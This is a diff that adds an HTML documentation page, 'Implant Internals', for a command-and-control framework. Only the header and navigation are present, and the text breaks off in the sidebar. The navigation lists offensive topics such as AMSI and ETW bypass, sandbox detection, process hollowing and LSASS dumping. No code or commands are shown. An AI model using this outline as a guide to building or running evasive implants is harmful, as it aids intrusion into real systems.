@@ -1,0 +1,2095 @@
+
+<!DOCTYPE html>
+
+<html class="no-js" lang="en">
+<head>
+<meta charset="utf-8"/>
+<meta content="width=device-width,initial-scale=1" name="viewport"/>
+<meta content="Comprehensive documentation for the Wolfgang C2 Framework" name="description"/>
+<link href="../plugins/" rel="prev"/>
+<link href="../../developer-guide/" rel="next"/>
+<link href="../../../architecture/implant-internals/" hreflang="pt-BR" rel="alternate"/>
+<link href="./" hreflang="en" rel="alternate"/>
+<link href="../../../assets/images/favicon.png" rel="icon"/>
+<meta content="mkdocs-1.6.1, mkdocs-material-9.7.5" name="generator"/>
+<title>Implant Internals - Wolfgang C2 Framework</title>
+<link href="../../../assets/stylesheets/main.484c7ddc.min.css" rel="stylesheet"/>
+<link href="../../../assets/stylesheets/palette.ab4e12ef.min.css" rel="stylesheet"/>
+<link crossorigin="" href="https://fonts.gstatic.com" rel="preconnect"/>
+<link href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&amp;display=fallback" rel="stylesheet"/>
+<style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+<script>__md_scope=new URL("../../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+</head>
+<body data-md-color-accent="purple" data-md-color-primary="deep-purple" data-md-color-scheme="slate" dir="ltr">
+<input autocomplete="off" class="md-toggle" data-md-toggle="drawer" id="__drawer" type="checkbox"/>
+<input autocomplete="off" class="md-toggle" data-md-toggle="search" id="__search" type="checkbox"/>
+<label class="md-overlay" for="__drawer"></label>
+<div data-md-component="skip">
+<a class="md-skip" href="#internos-do-implant">
+          Skip to content
+        </a>
+</div>
+<div data-md-component="announce">
+</div>
+<header class="md-header" data-md-component="header">
+<nav aria-label="Header" class="md-header__inner md-grid">
+<a aria-label="Wolfgang C2 Framework" class="md-header__button md-logo" data-md-component="logo" href="../../" title="Wolfgang C2 Framework">
+<svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"></path></svg>
+</a>
+<label class="md-header__button md-icon" for="__drawer">
+<svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"></path></svg>
+</label>
+<div class="md-header__title" data-md-component="header-title">
+<div class="md-header__ellipsis">
+<div class="md-header__topic">
+<span class="md-ellipsis">
+            Wolfgang C2 Framework
+          </span>
+</div>
+<div class="md-header__topic" data-md-component="header-topic">
+<span class="md-ellipsis">
+            
+              Implant Internals
+            
+          </span>
+</div>
+</div>
+</div>
+<form class="md-header__option" data-md-component="palette">
+<input aria-label="Switch to light mode" class="md-option" data-md-color-accent="purple" data-md-color-media="" data-md-color-primary="deep-purple" data-md-color-scheme="slate" id="__palette_0" name="__palette" type="radio"/>
+<label class="md-header__button md-icon" for="__palette_1" hidden="" title="Switch to light mode">
+<svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M12 18c-.89 0-1.74-.2-2.5-.55C11.56 16.5 13 14.42 13 12s-1.44-4.5-3.5-5.45C10.26 6.2 11.11 6 12 6a6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"></path></svg>
+</label>
+<input aria-label="Switch to dark mode" class="md-option" data-md-color-accent="purple" data-md-color-media="" data-md-color-primary="deep-purple" data-md-color-scheme="default" id="__palette_1" name="__palette" type="radio"/>
+<label class="md-header__button md-icon" for="__palette_0" hidden="" title="Switch to dark mode">
+<svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M12 8a4 4 0 0 0-4 4 4 4 0 0 0 4 4 4 4 0 0 0 4-4 4 4 0 0 0-4-4m0 10a6 6 0 0 1-6-6 6 6 0 0 1 6-6 6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"></path></svg>
+</label>
+</form>
+<script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+<div class="md-header__option">
+<div class="md-select">
+<button aria-label="Select language" class="md-header__button md-icon">
+<svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="m12.87 15.07-2.54-2.51.03-.03A17.5 17.5 0 0 0 14.07 6H17V4h-7V2H8v2H1v2h11.17C11.5 7.92 10.44 9.75 9 11.35 8.07 10.32 7.3 9.19 6.69 8h-2c.73 1.63 1.73 3.17 2.98 4.56l-5.09 5.02L4 19l5-5 3.11 3.11zM18.5 10h-2L12 22h2l1.12-3h4.75L21 22h2zm-2.62 7 1.62-4.33L19.12 17z"></path></svg>
+</button>
+<div class="md-select__inner">
+<ul class="md-select__list">
+<li class="md-select__item">
+<a class="md-select__link" href="../../../architecture/implant-internals/" hreflang="pt-BR">
+              Português
+            </a>
+</li>
+<li class="md-select__item">
+<a class="md-select__link" href="./" hreflang="en">
+              English
+            </a>
+</li>
+</ul>
+</div>
+</div>
+</div>
+<label class="md-header__button md-icon" for="__search">
+<svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"></path></svg>
+</label>
+<div class="md-search" data-md-component="search" role="dialog">
+<label class="md-search__overlay" for="__search"></label>
+<div class="md-search__inner" role="search">
+<form class="md-search__form" name="search">
+<input aria-label="Search" autocapitalize="off" autocomplete="off" autocorrect="off" class="md-search__input" data-md-component="search-query" name="query" placeholder="Search" required="" spellcheck="false" type="text"/>
+<label class="md-search__icon md-icon" for="__search">
+<svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"></path></svg>
+<svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"></path></svg>
+</label>
+<nav aria-label="Search" class="md-search__options">
+<button aria-label="Clear" class="md-search__icon md-icon" tabindex="-1" title="Clear" type="reset">
+<svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"></path></svg>
+</button>
+</nav>
+<div class="md-search__suggest" data-md-component="search-suggest"></div>
+</form>
+<div class="md-search__output">
+<div class="md-search__scrollwrap" data-md-scrollfix="" tabindex="0">
+<div class="md-search-result" data-md-component="search-result">
+<div class="md-search-result__meta">
+            Initializing search
+          </div>
+<ol class="md-search-result__list" role="presentation"></ol>
+</div>
+</div>
+</div>
+</div>
+</div>
+</nav>
+</header>
+<div class="md-container" data-md-component="container">
+<nav aria-label="Tabs" class="md-tabs" data-md-component="tabs">
+<div class="md-grid">
+<ul class="md-tabs__list">
+<li class="md-tabs__item">
+<a class="md-tabs__link" href="../../">
+        
+  
+  
+    
+  
+  Home
+
+      </a>
+</li>
+<li class="md-tabs__item">
+<a class="md-tabs__link" href="../../getting-started/">
+          
+  
+  
+    
+  
+  Getting Started
+
+        </a>
+</li>
+<li class="md-tabs__item">
+<a class="md-tabs__link" href="../../operator-guide/">
+          
+  
+  
+    
+  
+  Operator Guide
+
+        </a>
+</li>
+<li class="md-tabs__item md-tabs__item--active">
+<a class="md-tabs__link" href="../">
+          
+  
+  
+    
+  
+  Architecture
+
+        </a>
+</li>
+<li class="md-tabs__item">
+<a class="md-tabs__link" href="../../developer-guide/">
+          
+  
+  
+    
+  
+  Developer Guide
+
+        </a>
+</li>
+<li class="md-tabs__item">
+<a class="md-tabs__link" href="../../tradecraft/">
+          
+  
+  
+    
+  
+  Tradecraft
+
+        </a>
+</li>
+<li class="md-tabs__item">
+<a class="md-tabs__link" href="../../modules/">
+          
+  
+  
+    
+  
+  Module Catalog
+
+        </a>
+</li>
+<li class="md-tabs__item">
+<a class="md-tabs__link" href="../../api/">
+          
+  
+  
+    
+  
+  API Reference
+
+        </a>
+</li>
+</ul>
+</div>
+</nav>
+<main class="md-main" data-md-component="main">
+<div class="md-main__inner md-grid">
+<div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation">
+<div class="md-sidebar__scrollwrap">
+<div class="md-sidebar__inner">
+<nav aria-label="Navigation" class="md-nav md-nav--primary md-nav--lifted md-nav--integrated" data-md-level="0">
+<label class="md-nav__title" for="__drawer">
+<a aria-label="Wolfgang C2 Framework" class="md-nav__button md-logo" data-md-component="logo" href="../../" title="Wolfgang C2 Framework">
+<svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"></path></svg>
+</a>
+    Wolfgang C2 Framework
+  </label>
+<ul class="md-nav__list" data-md-scrollfix="">
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../">
+<span class="md-ellipsis">
+    
+  
+    Home
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item md-nav__item--nested">
+<input class="md-nav__toggle md-toggle md-toggle--indeterminate" id="__nav_2" type="checkbox"/>
+<div class="md-nav__link md-nav__container">
+<a class="md-nav__link" href="../../getting-started/">
+<span class="md-ellipsis">
+    
+  
+    Getting Started
+  
+
+    
+  </span>
+</a>
+<label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="0">
+<span class="md-nav__icon md-icon"></span>
+</label>
+</div>
+<nav aria-expanded="false" aria-labelledby="__nav_2_label" class="md-nav" data-md-level="1">
+<label class="md-nav__title" for="__nav_2">
+<span class="md-nav__icon md-icon"></span>
+            
+  
+    Getting Started
+  
+
+          </label>
+<ul class="md-nav__list" data-md-scrollfix="">
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../getting-started/quickstart/">
+<span class="md-ellipsis">
+    
+  
+    Quickstart
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../getting-started/first-implant/">
+<span class="md-ellipsis">
+    
+  
+    First Implant
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../getting-started/first-operation/">
+<span class="md-ellipsis">
+    
+  
+    First Operation
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../getting-started/next-steps/">
+<span class="md-ellipsis">
+    
+  
+    Next Steps
+  
+
+    
+  </span>
+</a>
+</li>
+</ul>
+</nav>
+</li>
+<li class="md-nav__item md-nav__item--nested">
+<input class="md-nav__toggle md-toggle md-toggle--indeterminate" id="__nav_3" type="checkbox"/>
+<div class="md-nav__link md-nav__container">
+<a class="md-nav__link" href="../../operator-guide/">
+<span class="md-ellipsis">
+    
+  
+    Operator Guide
+  
+
+    
+  </span>
+</a>
+<label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="0">
+<span class="md-nav__icon md-icon"></span>
+</label>
+</div>
+<nav aria-expanded="false" aria-labelledby="__nav_3_label" class="md-nav" data-md-level="1">
+<label class="md-nav__title" for="__nav_3">
+<span class="md-nav__icon md-icon"></span>
+            
+  
+    Operator Guide
+  
+
+          </label>
+<ul class="md-nav__list" data-md-scrollfix="">
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../operator-guide/server-setup/">
+<span class="md-ellipsis">
+    
+  
+    Server Setup
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../operator-guide/listeners/">
+<span class="md-ellipsis">
+    
+  
+    Listeners
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../operator-guide/implant-generation/">
+<span class="md-ellipsis">
+    
+  
+    Implant Generation
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../operator-guide/cli-reference/">
+<span class="md-ellipsis">
+    
+  
+    CLI Reference
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../operator-guide/agent-management/">
+<span class="md-ellipsis">
+    
+  
+    Agent Management
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../operator-guide/task-system/">
+<span class="md-ellipsis">
+    
+  
+    Task System
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../operator-guide/modules/">
+<span class="md-ellipsis">
+    
+  
+    Modules
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../operator-guide/exfiltration/">
+<span class="md-ellipsis">
+    
+  
+    Exfiltration
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../operator-guide/redirectors/">
+<span class="md-ellipsis">
+    
+  
+    Redirectors
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../operator-guide/plugins/">
+<span class="md-ellipsis">
+    
+  
+    Plugins
+  
+
+    
+  </span>
+</a>
+</li>
+</ul>
+</nav>
+</li>
+<li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+<input checked="" class="md-nav__toggle md-toggle" id="__nav_4" type="checkbox"/>
+<div class="md-nav__link md-nav__container">
+<a class="md-nav__link" href="../">
+<span class="md-ellipsis">
+    
+  
+    Architecture
+  
+
+    
+  </span>
+</a>
+<label class="md-nav__link" for="__nav_4" id="__nav_4_label" tabindex="">
+<span class="md-nav__icon md-icon"></span>
+</label>
+</div>
+<nav aria-expanded="true" aria-labelledby="__nav_4_label" class="md-nav" data-md-level="1">
+<label class="md-nav__title" for="__nav_4">
+<span class="md-nav__icon md-icon"></span>
+            
+  
+    Architecture
+  
+
+          </label>
+<ul class="md-nav__list" data-md-scrollfix="">
+<li class="md-nav__item">
+<a class="md-nav__link" href="../overview/">
+<span class="md-ellipsis">
+    
+  
+    Overview
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../protocol/">
+<span class="md-ellipsis">
+    
+  
+    Protocol
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../crypto/">
+<span class="md-ellipsis">
+    
+  
+    Cryptography
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../transport/">
+<span class="md-ellipsis">
+    
+  
+    Transport
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../modules/">
+<span class="md-ellipsis">
+    
+  
+    Modules
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../storage/">
+<span class="md-ellipsis">
+    
+  
+    Storage
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../auth/">
+<span class="md-ellipsis">
+    
+  
+    Authentication
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../plugins/">
+<span class="md-ellipsis">
+    
+  
+    Plugins
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item md-nav__item--active">
+<input class="md-nav__toggle md-toggle" id="__toc" type="checkbox"/>
+<label class="md-nav__link md-nav__link--active" for="__toc">
+<span class="md-ellipsis">
+    
+  
+    Implant Internals
+  
+
+    
+  </span>
+<span class="md-nav__icon md-icon"></span>
+</label>
+<a class="md-nav__link md-nav__link--active" href="./">
+<span class="md-ellipsis">
+    
+  
+    Implant Internals
+  
+
+    
+  </span>
+</a>
+<nav aria-label="Table of contents" class="md-nav md-nav--secondary">
+<label class="md-nav__title" for="__toc">
+<span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+<ul class="md-nav__list" data-md-component="toc" data-md-scrollfix="">
+<li class="md-nav__item">
+<a class="md-nav__link" href="#boot-sequence-completo">
+<span class="md-ellipsis">
+      
+        Boot Sequence Completo
+      
+    </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="#fase-1-auto-evasion">
+<span class="md-ellipsis">
+      
+        Fase 1: Auto-Evasion
+      
+    </span>
+</a>
+<nav aria-label="Fase 1: Auto-Evasion" class="md-nav">
+<ul class="md-nav__list">
+<li class="md-nav__item">
+<a class="md-nav__link" href="#sandbox-detection">
+<span class="md-ellipsis">
+      
+        Sandbox Detection
+      
+    </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="#amsi-e-etw-bypass-windows">
+<span class="md-ellipsis">
+      
+        AMSI e ETW Bypass (Windows)
+      
+    </span>
+</a>
+</li>
+</ul>
+</nav>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="#fase-3-registration-com-ecdh">
+<span class="md-ellipsis">
+      
+        Fase 3: Registration com ECDH
+      
+    </span>
+</a>
+<nav aria-label="Fase 3: Registration com ECDH" class="md-nav">
+<ul class="md-nav__list">
+<li class="md-nav__item">
+<a class="md-nav__link" href="#retries-com-backoff">
+<span class="md-ellipsis">
+      
+        Retries com Backoff
+      
+    </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="#sysinfo-platform-specific">
+<span class="md-ellipsis">
+      
+        Sysinfo Platform-Specific
+      
+    </span>
+</a>
+</li>
+</ul>
+</nav>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="#fase-5-module-system">
+<span class="md-ellipsis">
+      
+        Fase 5: Module System
+      
+    </span>
+</a>
+<nav aria-label="Fase 5: Module System" class="md-nav">
+<ul class="md-nav__list">
+<li class="md-nav__item">
+<a class="md-nav__link" href="#bridge-task-module-result">
+<span class="md-ellipsis">
+      
+        Bridge: Task -&gt; Module -&gt; Result
+      
+    </span>
+</a>
+</li>
+</ul>
+</nav>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="#fase-7-check-in-loop">
+<span class="md-ellipsis">
+      
+        Fase 7: Check-in Loop
+      
+    </span>
+</a>
+<nav aria-label="Fase 7: Check-in Loop" class="md-nav">
+<ul class="md-nav__list">
+<li class="md-nav__item">
+<a class="md-nav__link" href="#implementacao-do-loop">
+<span class="md-ellipsis">
+      
+        Implementacao do Loop
+      
+    </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="#jitter-com-distribuicao-normal">
+<span class="md-ellipsis">
+      
+        Jitter com Distribuicao Normal
+      
+    </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="#sleep-encryption-windows">
+<span class="md-ellipsis">
+      
+        Sleep Encryption (Windows)
+      
+    </span>
+</a>
+</li>
+</ul>
+</nav>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="#reconnector-resiliencia-de-comunicacao">
+<span class="md-ellipsis">
+      
+        Reconnector — Resiliencia de Comunicacao
+      
+    </span>
+</a>
+<nav aria-label="Reconnector — Resiliencia de Comunicacao" class="md-nav">
+<ul class="md-nav__list">
+<li class="md-nav__item">
+<a class="md-nav__link" href="#1-domain-rotation">
+<span class="md-ellipsis">
+      
+        1. Domain Rotation
+      
+    </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="#2-transport-fallback">
+<span class="md-ellipsis">
+      
+        2. Transport Fallback
+      
+    </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="#3-kill-switch">
+<span class="md-ellipsis">
+      
+        3. Kill Switch
+      
+    </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="#exponential-backoff">
+<span class="md-ellipsis">
+      
+        Exponential Backoff
+      
+    </span>
+</a>
+</li>
+</ul>
+</nav>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="#configuracao-embutida-ldflags">
+<span class="md-ellipsis">
+      
+        Configuracao Embutida (ldflags)
+      
+    </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="#pipe-relay">
+<span class="md-ellipsis">
+      
+        Pipe Relay
+      
+    </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="#veja-tambem">
+<span class="md-ellipsis">
+      
+        Veja tambem
+      
+    </span>
+</a>
+</li>
+</ul>
+</nav>
+</li>
+</ul>
+</nav>
+</li>
+<li class="md-nav__item md-nav__item--nested">
+<input class="md-nav__toggle md-toggle md-toggle--indeterminate" id="__nav_5" type="checkbox"/>
+<div class="md-nav__link md-nav__container">
+<a class="md-nav__link" href="../../developer-guide/">
+<span class="md-ellipsis">
+    
+  
+    Developer Guide
+  
+
+    
+  </span>
+</a>
+<label class="md-nav__link" for="__nav_5" id="__nav_5_label" tabindex="0">
+<span class="md-nav__icon md-icon"></span>
+</label>
+</div>
+<nav aria-expanded="false" aria-labelledby="__nav_5_label" class="md-nav" data-md-level="1">
+<label class="md-nav__title" for="__nav_5">
+<span class="md-nav__icon md-icon"></span>
+            
+  
+    Developer Guide
+  
+
+          </label>
+<ul class="md-nav__list" data-md-scrollfix="">
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../developer-guide/project-structure/">
+<span class="md-ellipsis">
+    
+  
+    Project Structure
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../developer-guide/adding-modules/">
+<span class="md-ellipsis">
+    
+  
+    Adding Modules
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../developer-guide/adding-transports/">
+<span class="md-ellipsis">
+    
+  
+    Adding Transports
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../developer-guide/plugin-sdk/">
+<span class="md-ellipsis">
+    
+  
+    Plugin SDK
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../developer-guide/testing/">
+<span class="md-ellipsis">
+    
+  
+    Testing
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../developer-guide/build-system/">
+<span class="md-ellipsis">
+    
+  
+    Build System
+  
+
+    
+  </span>
+</a>
+</li>
+</ul>
+</nav>
+</li>
+<li class="md-nav__item md-nav__item--nested">
+<input class="md-nav__toggle md-toggle md-toggle--indeterminate" id="__nav_6" type="checkbox"/>
+<div class="md-nav__link md-nav__container">
+<a class="md-nav__link" href="../../tradecraft/">
+<span class="md-ellipsis">
+    
+  
+    Tradecraft
+  
+
+    
+  </span>
+</a>
+<label class="md-nav__link" for="__nav_6" id="__nav_6_label" tabindex="0">
+<span class="md-nav__icon md-icon"></span>
+</label>
+</div>
+<nav aria-expanded="false" aria-labelledby="__nav_6_label" class="md-nav" data-md-level="1">
+<label class="md-nav__title" for="__nav_6">
+<span class="md-nav__icon md-icon"></span>
+            
+  
+    Tradecraft
+  
+
+          </label>
+<ul class="md-nav__list" data-md-scrollfix="">
+<li class="md-nav__item md-nav__item--nested">
+<input class="md-nav__toggle md-toggle md-toggle--indeterminate" id="__nav_6_2" type="checkbox"/>
+<div class="md-nav__link md-nav__container">
+<a class="md-nav__link" href="../../tradecraft/evasion/">
+<span class="md-ellipsis">
+    
+  
+    Evasion
+  
+
+    
+  </span>
+</a>
+<label class="md-nav__link" for="__nav_6_2" id="__nav_6_2_label" tabindex="0">
+<span class="md-nav__icon md-icon"></span>
+</label>
+</div>
+<nav aria-expanded="false" aria-labelledby="__nav_6_2_label" class="md-nav" data-md-level="2">
+<label class="md-nav__title" for="__nav_6_2">
+<span class="md-nav__icon md-icon"></span>
+            
+  
+    Evasion
+  
+
+          </label>
+<ul class="md-nav__list" data-md-scrollfix="">
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../tradecraft/evasion/amsi-bypass/">
+<span class="md-ellipsis">
+    
+  
+    AMSI Bypass
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../tradecraft/evasion/etw-bypass/">
+<span class="md-ellipsis">
+    
+  
+    ETW Bypass
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../tradecraft/evasion/sandbox-detection/">
+<span class="md-ellipsis">
+    
+  
+    Sandbox Detection
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../tradecraft/evasion/sleep-obfuscation/">
+<span class="md-ellipsis">
+    
+  
+    Sleep Obfuscation
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../tradecraft/evasion/direct-syscalls/">
+<span class="md-ellipsis">
+    
+  
+    Direct Syscalls
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../tradecraft/evasion/memory-encryption/">
+<span class="md-ellipsis">
+    
+  
+    Memory Encryption
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../tradecraft/evasion/hwbp-bypass/">
+<span class="md-ellipsis">
+    
+  
+    HWBP Bypass
+  
+
+    
+  </span>
+</a>
+</li>
+</ul>
+</nav>
+</li>
+<li class="md-nav__item md-nav__item--nested">
+<input class="md-nav__toggle md-toggle md-toggle--indeterminate" id="__nav_6_3" type="checkbox"/>
+<div class="md-nav__link md-nav__container">
+<a class="md-nav__link" href="../../tradecraft/injection/">
+<span class="md-ellipsis">
+    
+  
+    Injection
+  
+
+    
+  </span>
+</a>
+<label class="md-nav__link" for="__nav_6_3" id="__nav_6_3_label" tabindex="0">
+<span class="md-nav__icon md-icon"></span>
+</label>
+</div>
+<nav aria-expanded="false" aria-labelledby="__nav_6_3_label" class="md-nav" data-md-level="2">
+<label class="md-nav__title" for="__nav_6_3">
+<span class="md-nav__icon md-icon"></span>
+            
+  
+    Injection
+  
+
+          </label>
+<ul class="md-nav__list" data-md-scrollfix="">
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../tradecraft/injection/process-hollowing/">
+<span class="md-ellipsis">
+    
+  
+    Process Hollowing
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../tradecraft/injection/earlybird-apc/">
+<span class="md-ellipsis">
+    
+  
+    EarlyBird APC
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../tradecraft/injection/module-stomping/">
+<span class="md-ellipsis">
+    
+  
+    Module Stomping
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../tradecraft/injection/reflective-loading/">
+<span class="md-ellipsis">
+    
+  
+    Reflective Loading
+  
+
+    
+  </span>
+</a>
+</li>
+</ul>
+</nav>
+</li>
+<li class="md-nav__item md-nav__item--nested">
+<input class="md-nav__toggle md-toggle md-toggle--indeterminate" id="__nav_6_4" type="checkbox"/>
+<div class="md-nav__link md-nav__container">
+<a class="md-nav__link" href="../../tradecraft/credential-access/">
+<span class="md-ellipsis">
+    
+  
+    Credential Access
+  
+
+    
+  </span>
+</a>
+<label class="md-nav__link" for="__nav_6_4" id="__nav_6_4_label" tabindex="0">
+<span class="md-nav__icon md-icon"></span>
+</label>
+</div>
+<nav aria-expanded="false" aria-labelledby="__nav_6_4_label" class="md-nav" data-md-level="2">
+<label class="md-nav__title" for="__nav_6_4">
+<span class="md-nav__icon md-icon"></span>
+            
+  
+    Credential Access
+  
+
+          </label>
+<ul class="md-nav__list" data-md-scrollfix="">
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../tradecraft/credential-access/lsass-dumping/">
+<span class="md-ellipsis">
+    
+  
+    LSASS Dumping
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
